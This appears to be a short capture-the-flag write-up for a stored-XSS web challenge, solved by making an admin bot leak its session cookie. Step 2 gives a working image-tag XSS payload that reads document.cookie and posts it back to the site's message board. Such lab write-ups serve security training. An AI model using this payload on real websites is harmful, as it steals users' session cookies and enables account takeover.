<img width="420" height="606" alt="Screenshot 2026-07-12 075122" src="https://github.com/user-attachments/assets/04260dc3-7251-4d2e-81dc-506bf80b02ed" />


Step 1: Download the challenge zip and read messages.html / bot.js

Step 2: Submit XSS (message field):

`<img src=x onerror="fetch('/submit',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'name=leak&message='+encodeURIComponent(document.cookie)})">`

Step 3: Report a URL the bot can open on the same host as the cookie domain (local compose uses TARGET_HOST=localhost), e.g.:

<pre>http://localhost:5000/messages</pre>

Step 4: Refresh /messages — look for session=OPUCC{...}.
